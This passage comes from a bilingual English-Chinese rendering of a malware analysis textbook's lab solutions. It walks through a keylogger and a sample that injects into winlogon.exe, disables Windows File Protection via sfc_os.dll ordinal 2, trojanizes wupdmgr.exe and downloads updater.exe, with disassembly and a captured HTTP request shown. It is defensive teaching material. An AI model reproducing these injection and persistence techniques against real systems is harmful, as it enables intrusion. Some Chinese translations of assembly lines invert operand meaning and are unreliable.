  id: totrans-3867
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040110F push 400h ; nMaxCount 00401114 push offset String ; lpString 00401119
    call ds:**GetForegroundWindow**
  id: totrans-3868
  prefs: []
  type: TYPE_NORMAL
  zh: 0040110F push 400h ; nMaxCount 00401114 push offset String ; lpString 00401119
    call ds:**GetForegroundWindow**
- en: 0040111F push eax ; hWnd
  id: totrans-3869
  prefs: []
  type: TYPE_NORMAL
  zh: 0040111F push eax ; hWnd
- en: 00401120 call ds:**GetWindowTextA**
  id: totrans-3870
  prefs: []
  type: TYPE_NORMAL
  zh: 00401120 call ds:**GetWindowTextA**
- en: 00401126 push offset String ; Str2
  id: totrans-3871
  prefs: []
  type: TYPE_NORMAL
  zh: 00401126 push offset String ; Str2
- en: 0040112B push offset Dest ; Str1
  id: totrans-3872
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112B push offset Dest ; Str1
- en: 00401130 call _strcmp
  id: totrans-3873
  prefs: []
  type: TYPE_NORMAL
  zh: 00401130 call _strcmp
- en: '*Listing 12-16L: Opening the log file and getting the window title* Once the
    program writes the window title to the log file, it enters a large jump table,
    as shown in Listing 12-17L at . Recognizing that var_C contains the virtual key
    code that was passed into the function, we see the virtual key code used as an
    index to a lookup table at . The value received from the lookup table is used
    as an index into the jump table off_401441 at .'
  id: totrans-3874
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-16L：打开日志文件并获取窗口标题* 一旦程序将窗口标题写入日志文件，它就会进入一个大的跳转表，如列表12-17L所示。在处，我们认识到var_C包含传递给函数的虚拟键码，我们看到虚拟键码被用作查找表的索引。从查找表中接收到的值被用作跳转表off_401441的索引。'
- en: 0040120B sub eax, 8 
  id: totrans-3875
  prefs: []
  type: TYPE_NORMAL
  zh: 0040120B sub eax, 8 
- en: '...'
  id: totrans-3876
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040121B mov edx, [ebp+var_C]
  id: totrans-3877
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121B mov edx, [ebp+var_C]
- en: 0040121E xor ecx, ecx
  id: totrans-3878
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121E xor ecx, ecx
- en: 00401220 mov cl, ds:byte_40148D[edx]
  id: totrans-3879
  prefs: []
  type: TYPE_NORMAL
  zh: 00401220 mov cl, ds:byte_40148D[edx]
- en: '00401226 jmp ds:off_401441[ecx*4]  ; switch jump *Listing 12-17L: Virtual
    key code jump table*'
  id: totrans-3880
  prefs: []
  type: TYPE_NORMAL
  zh: 00401226 jmp ds:off_401441[ecx*4]  ; switch jump *列表12-17L：虚拟键码跳转表*
- en: '**1 2**'
  id: totrans-3881
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: We follow the lookup process by choosing a value like VK_SHIFT (0x10).
  id: totrans-3882
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过选择一个值如VK_SHIFT（0x10）来跟踪查找过程。
- en: At , 8 is subtracted from the value, leaving us with 0x8 (0x10 – 0x8).
  id: totrans-3883
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，从值中减去8，留下0x8（0x10 – 0x8）。
- en: Looking at offset 0x8 into byte_40148D, as shown in Listing 12-18L, provides
    the value 3, which is stored in ECX. ECX is then multiplied by 4 at , yielding
    0xC, which is used as an offset into off_401441\. This returns the location loc_401249,
    where we find the string [SHIFT] written to the log file.
  id: totrans-3884
  prefs: []
  type: TYPE_NORMAL
  zh: 查看byte_40148D的偏移量0x8，如列表12-18L所示，提供值为3，存储在ECX中。然后，在处将ECX乘以4，得到0xC，用作off_401441的偏移量。这返回loc_401249的位置，我们在日志文件中找到写入的字符串[SHIFT]。
- en: byte_40148D db 0, 1, 12h, 12h
  id: totrans-3885
  prefs: []
  type: TYPE_NORMAL
  zh: byte_40148D db 0, 1, 12h, 12h
- en: db 12h, 2, 12h, 12h
  id: totrans-3886
  prefs: []
  type: TYPE_NORMAL
  zh: db 12h, 2, 12h, 12h
- en: db 3, 4, 12h, 12h
  id: totrans-3887
  prefs: []
  type: TYPE_NORMAL
  zh: db 3, 4, 12h, 12h
- en: '*Listing 12-18L: The offset table for byte_40148D*'
  id: totrans-3888
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表12-18L：byte_40148D的偏移量表*'
- en: We are able to conclude that this malware is a keylogger that logs keystrokes
    to the file *practicalmalwareanalysis.log*. This keylogger uses SetWindowsHookEx
    to implement its keylogging functionality.
  id: totrans-3889
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以得出结论，这种恶意软件是一个键盘记录器，它将按键记录到文件*practicalmalwareanalysis.log*中。这个键盘记录器使用SetWindowsHookEx来实现其键盘记录功能。
- en: '**Lab 12-4 Solutions**'
  id: totrans-3890
  prefs: []
  type: TYPE_NORMAL
  zh: '**12-4实验解决方案**'
- en: '***Short Answers***'
  id: totrans-3891
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答题**'
- en: 1\.
  id: totrans-3892
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The malware checks to see if a given PID is *winlogon.exe*.
  id: totrans-3893
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件检查给定的PID是否为*winlogon.exe*。
- en: 2\.
  id: totrans-3894
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: '*Winlogon.exe* is the process injected.'
  id: totrans-3895
  prefs: []
  type: TYPE_NORMAL
  zh: '*Winlogon.exe*是注入的进程。'
- en: 3\.
  id: totrans-3896
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The DLL *sfc_os.dll* will be used to disable Windows File Protection.
  id: totrans-3897
  prefs: []
  type: TYPE_NORMAL
  zh: 将使用DLL *sfc_os.dll*来禁用Windows文件保护。
- en: Solutions to Labs
  id: totrans-3898
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**599**'
  id: totrans-3899
  prefs: []
  type: TYPE_NORMAL
  zh: '**599**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3900
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 4\.
  id: totrans-3901
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The fourth argument passed to CreateRemoteThread is a function pointer to an
    unnamed ordinal 2 (SfcTerminateWatcherThread) of *sfc_os.dll*.
  id: totrans-3902
  prefs: []
  type: TYPE_NORMAL
  zh: 传递给CreateRemoteThread的第四个参数是到*sfc_os.dll*中未命名的序号2（SfcTerminateWatcherThread）的函数指针。
- en: 5\.
  id: totrans-3903
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The malware drops a binary from its resource section and overwrites the old
    Windows Update binary ( *wupdmgr.exe*) with it. Before overwriting the real *wupdmgr.exe*,
    the malware copies it to the *%TEMP%* directory for later usage.
  id: totrans-3904
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件从其资源部分中释放一个二进制文件，并用它覆盖旧的Windows Update二进制文件（*wupdmgr.exe*）。在覆盖真实的*wupdmgr.exe*之前，恶意软件将其复制到*%TEMP%*目录以供以后使用。
- en: 6\.
  id: totrans-3905
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The malware injects a remote thread into *winlogon.exe* and calls a function
    exported by *sfc_os.dll*, ordinal 2 (SfcTerminateWatcherThread), to disable Windows
    File Protection until the next reboot. The CreateRemoteThread call is necessary
    because this function must be executed inside the *winlogon.exe* process. The
    malware trojanizes *wupdmgr.exe* by using that executable to update its own malware
    and call the original Windows Update binary, which was saved to the *%TEMP%* directory.
  id: totrans-3906
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将远程线程注入到*winlogon.exe*中，并调用*sfc_os.dll*导出的函数，序号2（SfcTerminateWatcherThread），以在下次重启之前禁用Windows文件保护。CreateRemoteThread调用是必要的，因为此函数必须在*winlogon.exe*进程中执行。恶意软件通过使用该可执行文件来更新其恶意软件并调用保存到*%TEMP%*目录中的原始Windows
    Update二进制文件来木马化*wupdmgr.exe*。
- en: '***Detailed Analysis***'
  id: totrans-3907
  prefs: []
  type: TYPE_NORMAL
  zh: '**详细分析**'
- en: We begin with basic static analysis. Examining the imports, we see CreateRemoteThread,
    but not WriteProcessMemory or VirtualAllocEx, which is interesting. We also see
    imports for resource manipulation, such as LoadResource and FindResourceA. Examining
    the malware with Resource Hacker, we notice an additional program named BIN stored
    in the resource section.
  id: totrans-3908
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从基本的静态分析开始。检查导入项，我们看到CreateRemoteThread，但没有WriteProcessMemory或VirtualAllocEx，这很引人注目。我们还看到资源操作的导入项，例如LoadResource和FindResourceA。使用Resource
    Hacker检查恶意软件，我们注意到资源部分中存储了一个名为BIN的附加程序。
- en: Next, we turn to basic dynamic techniques. Procmon shows us that the malware
    creates the file *%TEMP%\winup.exe* and overwrites the Windows Update binary at
    *%SystemRoot%\System32\wupdmgr.exe*. Comparing the dropped *wupdmgr.exe* with
    the file in the BIN resource section, we see that they are the same. (Windows
    File Protection should restore the original file, but it doesn’t.)
  id: totrans-3909
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们转向基本的动态技术。Procmon 显示恶意软件创建了文件 *%TEMP%\winup.exe* 并覆盖了 Windows 更新二进制文件
    *%SystemRoot%\System32\wupdmgr.exe*。将下落的 *wupdmgr.exe* 与 BIN 资源部分中的文件进行比较，我们发现它们是相同的。（Windows
    文件保护应该恢复原始文件，但它没有。）
- en: Running Netcat, we find that the malware attempts to download *updater.exe*
    from *www.practicalmalwareanalysis.com*, as shown in Listing 12-19L.
  id: totrans-3910
  prefs: []
  type: TYPE_NORMAL
  zh: 运行 Netcat，我们发现恶意软件试图从 *www.practicalmalwareanalysis.com* 下载 *updater.exe*，如列表
    12-19L 所示。
- en: GET /updater.exe HTTP/1.1
  id: totrans-3911
  prefs: []
  type: TYPE_NORMAL
  zh: GET /updater.exe HTTP/1.1
- en: 'Accept: */*'
  id: totrans-3912
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept: */*'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-3913
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR'
  id: totrans-3914
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR
    2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648) Host:
    www.practicalmalwareanalysis.com'
- en: '2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
    Host: www.practicalmalwareanalysis.com'
  id: totrans-3915
  prefs: []
  type: TYPE_NORMAL
  zh: '2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)
    主机: www.practicalmalwareanalysis.com'
- en: 'Connection: Keep-Alive'
  id: totrans-3916
  prefs: []
  type: TYPE_NORMAL
  zh: 'Connection: Keep-Alive'
- en: '*Listing 12-19L: HTTP GET request performed after running* Lab12-04.exe We
    load the malware into IDA Pro and scroll to the main function at address 0x00401350\.
    A few lines from the start of the main function, we see the malware resolving
    functions for Windows process enumeration within *psapi.dll*, as shown in Listing
    12-20L.'
  id: totrans-3917
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-19L：运行 Lab12-04.exe 后执行的 HTTP GET 请求* 我们将恶意软件加载到 IDA Pro 中，并滚动到地址 0x00401350
    的主函数。在主函数的开始几行，我们看到恶意软件正在解析 Windows 进程枚举中的函数，如列表 12-20L 所示。'
- en: 004013AA push offset ProcName
  id: totrans-3918
  prefs: []
  type: TYPE_NORMAL
  zh: 004013AA 将 ProcName 的偏移量压入栈中
- en: ; " **EnumProcessModules**"
  id: totrans-3919
  prefs: []
  type: TYPE_NORMAL
  zh: ; " **EnumProcessModules**"
- en: 004013AF push offset aPsapi_dll ; " **psapi.dll**"
  id: totrans-3920
  prefs: []
  type: TYPE_NORMAL
  zh: 004013AF 将 aPsapi_dll 的偏移量压入栈中 ; " **psapi.dll**"
- en: 004013B4 call ds:**LoadLibraryA** 
  id: totrans-3921
  prefs: []
  type: TYPE_NORMAL
  zh: 004013B4 调用 ds:**LoadLibraryA** 
- en: '**600**'
  id: totrans-3922
  prefs: []
  type: TYPE_NORMAL
  zh: '**600**'
- en: Appendix C
  id: totrans-3923
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3924
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004013BA push eax
  id: totrans-3925
  prefs: []
  type: TYPE_NORMAL
  zh: 004013BA 将 eax 压入栈中
- en: 004013BB call ds:**GetProcAddress** 
  id: totrans-3926
  prefs: []
  type: TYPE_NORMAL
  zh: 004013BB 调用 ds:**GetProcAddress** 
- en: '004013C1 mov **dword_40312C**, eax ; Rename to myEnumProcessModules *Listing
    12-20L: Dynamically resolving process enumeration imports* Listing 12-20L also
    shows one of the three functions the malware manually resolves using LoadLibraryA
    at  and GetProcAddress at .'
  id: totrans-3927
  prefs: []
  type: TYPE_NORMAL
  zh: 004013C1 将 dword_40312C 的值移动到 eax 寄存器中 ; 重命名为 myEnumProcessModules *列表 12-20L：动态解析进程枚举导入*
    列表 12-20L 还显示了恶意软件使用 LoadLibraryA（在  处）和 GetProcAddress（在  处）手动解析的三个函数之一。
- en: The malware saves the function pointer to dword_40312C (here at ), dword_403128,
    and dword_403124\. We’ll change the names of these global variables to make it
    easier to identify calls to the function later in our analysis, renaming them
    to myEnumProcessModules, myGetModuleBaseNameA, and myEnumProcesses.
  id: totrans-3928
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将函数指针保存到 dword_40312C（此处为 ）、dword_403128 和 dword_403124。我们将这些全局变量的名称更改，以便在分析中更容易识别对函数的调用，将它们重命名为
    myEnumProcessModules、myGetModuleBaseNameA 和 myEnumProcesses。
- en: Once the malware checks the values of the function pointers, it arrives at 0x00401423
    and the call myEnumProcesses, as shown in Listing 12-21L at . The goal of the
    code in this listing is to return an array of PIDs on the system. The start of
    the array is referenced by the local variable dwProcessId shown at .
  id: totrans-3929
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦恶意软件检查了函数指针的值，它就会到达 0x00401423 并调用 myEnumProcesses，如列表 12-21L 中的  所示。此列表中代码的目标是返回系统上的
    PID 数组。数组的起始位置由局部变量 dwProcessId（如  所示）引用。
- en: '**00401423** lea eax, [ebp+var_1228]'
  id: totrans-3930
  prefs: []
  type: TYPE_NORMAL
  zh: '**00401423** 将 [ebp+var_1228] 的值加载到 eax 寄存器中'
- en: 00401429 push eax ; _DWORD
  id: totrans-3931
  prefs: []
  type: TYPE_NORMAL
  zh: 00401429 将 eax 压入栈中 ; _DWORD
- en: 0040142A push 1000h ; _DWORD
  id: totrans-3932
  prefs: []
  type: TYPE_NORMAL
  zh: 0040142A 将 1000h 压入栈中 ; _DWORD
- en: 0040142F lea ecx, [ebp+dwProcessId] 
  id: totrans-3933
  prefs: []
  type: TYPE_NORMAL
  zh: 0040142F 将 [ebp+dwProcessId] 的值加载到 ecx 寄存器中 
- en: 00401435 push ecx ; _DWORD
  id: totrans-3934
  prefs: []
  type: TYPE_NORMAL
  zh: 00401435 将 ecx 压入栈中 ; _DWORD
- en: 00401436 call myEnumProcesses 
  id: totrans-3935
  prefs: []
  type: TYPE_NORMAL
  zh: 00401436 调用 myEnumProcesses 
- en: 0040143C test eax, eax
  id: totrans-3936
  prefs: []
  type: TYPE_NORMAL
  zh: 0040143C 测试 eax 的值，eax
- en: '**1 2**'
  id: totrans-3937
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: 0040143E jnz short loc_401
  id: totrans-3938
  prefs: []
  type: TYPE_NORMAL
  zh: 0040143E 如果 jnz 不为零，则跳转到 short loc_401
- en: '*Listing 12-21L: Enumerating processes*'
  id: totrans-3939
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-21L：枚举进程*'
- en: The malware then begins to loop through the PIDs, passing each to the subroutine
    at 0x00401000, as shown in Listing 12-22L. We see an index into the array referenced
    by dwProcessId, which is calculated before calling sub_401000\.
  id: totrans-3940
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，恶意软件开始遍历 PID，将每个传递到 0x00401000 的子程序，如列表 12-22L 所示。我们看到 dwProcessId 引用的数组索引，它在调用
    sub_401000 之前计算。
- en: 00401495 mov eax, [ebp+var_1238]
  id: totrans-3941
  prefs: []
  type: TYPE_NORMAL
  zh: 00401495 将 eax 寄存器的值移动到 [ebp+var_1238]
- en: 0040149B mov ecx, [ebp+eax*4+**dwProcessId**]
  id: totrans-3942
  prefs: []
  type: TYPE_NORMAL
  zh: 0040149B 将 ecx 寄存器的值移动到 [ebp+eax*4+**dwProcessId**]
- en: 004014A2 push ecx ; dwProcessId
  id: totrans-3943
  prefs: []
  type: TYPE_NORMAL
  zh: 004014A2 将 ecx 压入栈中 ; dwProcessId
- en: 004014A3 call **sub_401000**
  id: totrans-3944
  prefs: []
  type: TYPE_NORMAL
  zh: 004014A3 调用 **sub_401000**
- en: '*Listing 12-22L: Looping through PIDs*'
  id: totrans-3945
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-22L：遍历进程 ID*'
- en: We examine the internals of sub_401000 and see two local variables set (Str1
    and Str2), as shown in Listing 12-23L. The variable Str1 will contain the string
    "<not real>", and Str2 will contain "winlogon.exe".
  id: totrans-3946
  prefs: []
  type: TYPE_NORMAL
  zh: 我们检查 sub_401000 的内部结构，看到设置了两个局部变量（Str1 和 Str2），如列表 12-23L 所示。变量 Str1 将包含字符串
    "<not real>"，而 Str2 将包含 "winlogon.exe"。
- en: 0040100A mov eax, dword ptr aWinlogon_exe ; "winlogon.exe"
  id: totrans-3947
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100A mov eax, dword ptr aWinlogon_exe ; "winlogon.exe"
- en: 0040100F mov dword ptr [ebp+**Str2**], eax
  id: totrans-3948
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100F mov dword ptr [ebp+**Str2**], eax
- en: '...'
  id: totrans-3949
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040102C mov ecx, dword ptr aNotReal ; "<not real>"
  id: totrans-3950
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102C mov ecx, dword ptr aNotReal ; "<not real>"
- en: 00401032 mov dword ptr [ebp+**Str1**], ecx
  id: totrans-3951
  prefs: []
  type: TYPE_NORMAL
  zh: 00401032 mov dword ptr [ebp+**Str1**], ecx
- en: '*Listing 12-23L: Initialization of strings*'
  id: totrans-3952
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-23L：字符串的初始化*'
- en: Solutions to Labs
  id: totrans-3953
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**601**'
  id: totrans-3954
  prefs: []
  type: TYPE_NORMAL
  zh: '**601**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3955
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Next, the malware passes the loop parameter (dwProcessId) to the OpenProcess
    call in order to obtain a handle to that process, as shown at 
  id: totrans-3956
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，恶意软件将循环参数（dwProcessId）传递给 OpenProcess 调用，以获取该进程的句柄，如所示。
- en: in Listing 12-24L. The handle returned from OpenProcess is stored in EAX
  id: totrans-3957
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 12-24L 中返回的 OpenProcess 句柄存储在 EAX
- en: and passed to the myEnumProcessModules function at , which returns an array
    of handles for each module loaded into a process.
  id: totrans-3958
  prefs: []
  type: TYPE_NORMAL
  zh: 并传递给处的 myEnumProcessModules 函数，该函数返回每个进程加载的模块的句柄数组。
- en: 00401070 push edx ; dwProcessId
  id: totrans-3959
  prefs: []
  type: TYPE_NORMAL
  zh: 00401070 push edx ; dwProcessId
- en: 00401071 push 0 ; bInheritHandle
  id: totrans-3960
  prefs: []
  type: TYPE_NORMAL
  zh: 00401071 push 0 ; bInheritHandle
- en: 00401073 push 410h ; dwDesiredAccess
  id: totrans-3961
  prefs: []
  type: TYPE_NORMAL
  zh: 00401073 push 410h ; dwDesiredAccess
- en: 00401078 call ds:OpenProcess 
  id: totrans-3962
  prefs: []
  type: TYPE_NORMAL
  zh: 00401078 call ds:OpenProcess 
- en: '...'
  id: totrans-3963
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 00401087 lea eax, [ebp+var_120]
  id: totrans-3964
  prefs: []
  type: TYPE_NORMAL
  zh: 00401087 lea eax, [ebp+var_120]
- en: 0040108D push eax
  id: totrans-3965
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108D push eax
- en: 0040108E push 4
  id: totrans-3966
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108E push 4
- en: 00401090 lea ecx, [ebp+var_11C]
  id: totrans-3967
  prefs: []
  type: TYPE_NORMAL
  zh: 00401090 lea ecx, [ebp+var_11C]
- en: 00401096 push ecx
  id: totrans-3968
  prefs: []
  type: TYPE_NORMAL
  zh: 00401096 push ecx
- en: 00401097 mov edx, [ebp+hObject]
  id: totrans-3969
  prefs: []
  type: TYPE_NORMAL
  zh: 00401097 mov edx, [ebp+hObject]
- en: 0040109A push edx
  id: totrans-3970
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109A push edx
- en: 0040109B call myEnumProcessModules
  id: totrans-3971
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109B call myEnumProcessModules
- en: '*Listing 12-24L: For each process, enumerate the modules* As shown in Listing
    12-25L, the malware attempts to get the base name of the module’s PID by using
    GetModuleBaseNameA. If it succeeds, Str1 will contain the string of the base name
    of the module for the PID passed to this subroutine; if not, it will keep the
    initialized value "<not real>".'
  id: totrans-3972
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-24L：为每个进程枚举模块* 如列表 12-25L 所示，恶意软件尝试使用 GetModuleBaseNameA 获取模块 PID 的基本名称。如果成功，Str1
    将包含传递给此子程序的 PID 的模块基本名称字符串；如果不成功，它将保持初始化值 "<not real>"。'
- en: 004010A5 push 104h
  id: totrans-3973
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A5 push 104h
- en: 004010AA lea eax, [ebp+Str1]; will change
  id: totrans-3974
  prefs: []
  type: TYPE_NORMAL
  zh: 004010AA lea eax, [ebp+Str1]; 将会改变
- en: 004010B0 push eax
  id: totrans-3975
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B0 push eax
- en: 004010B1 mov ecx, [ebp+var_11C]
  id: totrans-3976
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B1 mov ecx, [ebp+var_11C]
- en: 004010B7 push ecx
  id: totrans-3977
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B7 push ecx
- en: 004010B8 mov edx, [ebp+hObject]
  id: totrans-3978
  prefs: []
  type: TYPE_NORMAL
  zh: 004010B8 mov edx, [ebp+hObject]
- en: 004010BB push edx
  id: totrans-3979
  prefs: []
  type: TYPE_NORMAL
  zh: 004010BB push edx
- en: 004010BC call myGetModuleBaseNameA
  id: totrans-3980
  prefs: []
  type: TYPE_NORMAL
  zh: 004010BC call myGetModuleBaseNameA
- en: '*Listing 12-25L: Getting the name of each module*'
  id: totrans-3981
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-25L：获取每个模块的名称*'
- en: The old initialized string "<not real>" should have the name of the base module
    returned from GetModuleBaseNameA. This string is compared to the
  id: totrans-3982
  prefs: []
  type: TYPE_NORMAL
  zh: 旧的初始化字符串 "<not real>" 应该包含从 GetModuleBaseNameA 返回的基本模块的名称。此字符串与
- en: '"winlogon.exe" string. If the strings match, EAX will be equal to 0, and the
    function will return with EAX equal to 1\. If the strings do not match, EAX'
  id: totrans-3983
  prefs: []
  type: TYPE_NORMAL
  zh: '"winlogon.exe" 字符串。如果字符串匹配，EAX 将等于 0，函数将返回 EAX 等于 1。如果字符串不匹配，EAX'
- en: will be equal to 0 on return. We can now safely say that sub_401000 is attempting
    to determine which PID is associated with *winlogon.exe*.
  id: totrans-3984
  prefs: []
  type: TYPE_NORMAL
  zh: 在返回时将等于 0。现在我们可以安全地说 sub_401000 正在尝试确定与 *winlogon.exe* 关联的 PID。
- en: Now that we know what sub_401000 does, we can rename it as PIDLookup.
  id: totrans-3985
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道了 sub_401000 的功能，我们可以将其重命名为 PIDLookup。
- en: Notice at  in Listing 12-26L that the return value in EAX is tested to see
    if it is 0\. If so, the code jumps to loc_4014CF, incrementing the loop counter
    and rerunning the PIDLookup function with a new PID. Otherwise, if the PID
  id: totrans-3986
  prefs: []
  type: TYPE_NORMAL
  zh: 注意在列表 12-26L 中的处，返回值 EAX 被检查是否为 0。如果是，代码将跳转到 loc_4014CF，增加循环计数器，并使用新的 PID 重新运行
    PIDLookup 函数。否则，如果 PID
- en: matched *winlogon.exe*, then the PID will be passed to the sub_401174, as seen
    at  in the listing.
  id: totrans-3987
  prefs: []
  type: TYPE_NORMAL
  zh: 匹配 *winlogon.exe*，然后进程ID将被传递到 sub_401174，如列表中的所示。
- en: '**602**'
  id: totrans-3988
  prefs: []
  type: TYPE_NORMAL
  zh: '**602**'
- en: Appendix C
  id: totrans-3989
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3990
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004014A3 call PIDLookup
  id: totrans-3991
  prefs: []
  type: TYPE_NORMAL
  zh: 004014A3 call PIDLookup
- en: 004014A8 add esp, 4
  id: totrans-3992
  prefs: []
  type: TYPE_NORMAL
  zh: 004014A8 add esp, 4
- en: 004014AB mov [ebp+var_114], eax
  id: totrans-3993
  prefs: []
  type: TYPE_NORMAL
  zh: 004014AB mov [ebp+var_114], eax
- en: 004014B1 cmp [ebp+var_114], 0 
  id: totrans-3994
  prefs: []
  type: TYPE_NORMAL
  zh: 004014B1 cmp [ebp+var_114], 0 
- en: 004014B8 jz short loc_4014CF
  id: totrans-3995
  prefs: []
  type: TYPE_NORMAL
  zh: 004014B8 jz short loc_4014CF
- en: '...'
  id: totrans-3996
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004014E4 mov ecx, [ebp+var_1234]
  id: totrans-3997
  prefs: []
  type: TYPE_NORMAL
  zh: 004014E4 mov ecx, [ebp+var_1234]
- en: 004014EA push ecx ; dwProcessId
  id: totrans-3998
  prefs: []
  type: TYPE_NORMAL
  zh: 004014EA push ecx ; dwProcessId
- en: 004014EB call **sub_401174** 
  id: totrans-3999
  prefs: []
  type: TYPE_NORMAL
  zh: 004014EB call **sub_401174** 
- en: '*Listing 12-26L: PID lookup and comparison*'
  id: totrans-4000
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 12-26L：PID 查找和比较*'
- en: Examining sub_401174, we see another subroutine called immediately, with the
    argument SeDebugPrivilege. This function performs the SeDebugPrivilege privilege-escalation
    procedure we discussed extensively in Chapter 11\.
  id: totrans-4001
  prefs: []
  type: TYPE_NORMAL
  zh: 检查 sub_401174，我们看到立即调用另一个子例程，参数为 SeDebugPrivilege。此函数执行我们在第 11 章中广泛讨论的 SeDebugPrivilege
    权限升级过程。
- en: Following the SeDebugPrivilege escalation function, we see sfc_os.dll passed
    to LoadLibraryA, as shown at  in Listing 12-27L. Next, GetProcAddress is called
    on the handle to *sfc_os.dll* and ordinal 2 (an undocumented Windows function).
    Ordinal 2 is pushed onto the stack at . The function pointer of ordinal 2 is
    saved to lpStartAddress at  (the label provided by IDA Pro). The malware then
    calls OpenProcess on the PID of *winlogon.exe* and dwDesiredAccess of 0x1F0FFF
    (symbolic constant for PROCESS_ALL_ACCESS). The handle to *winlogon.exe* is saved
    to hProcess at .
  id: totrans-4002
  prefs: []
  type: TYPE_NORMAL
  zh: 在 SeDebugPrivilege 升级函数之后，我们看到 sfc_os.dll 被传递给 LoadLibraryA，如列出 12-27L 中所示。接下来，在
    *sfc_os.dll* 的句柄上调用 GetProcAddress，并传递序号 2（一个未记录的 Windows 函数）。序号 2 被推入堆栈中，在 
    处。序号 2 的函数指针被保存到 lpStartAddress 中，在  处（由 IDA Pro 提供的标签）。恶意软件随后调用 OpenProcess，传递
    *winlogon.exe* 的 PID 和 dwDesiredAccess 为 0x1F0FFF（PROCESS_ALL_ACCESS 的符号常数）。*winlogon.exe*
    的句柄被保存到 hProcess 中，在  处。
- en: '**1 2**'
  id: totrans-4003
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 2**'
- en: 004011A1 push 2  ; lpProcName
  id: totrans-4004
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A1 push 2  ; lpProcName
- en: 004011A3 push offset LibFileName ; " **sfc_os.dll**"
  id: totrans-4005
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A3 push offset LibFileName ; " **sfc_os.dll**"
- en: 004011A8 call ds:**LoadLibraryA** 
  id: totrans-4006
  prefs: []
  type: TYPE_NORMAL
  zh: 004011A8 call ds:**LoadLibraryA** 
- en: 004011AE push eax ; hModule
  id: totrans-4007
  prefs: []
  type: TYPE_NORMAL
  zh: 004011AE push eax ; hModule
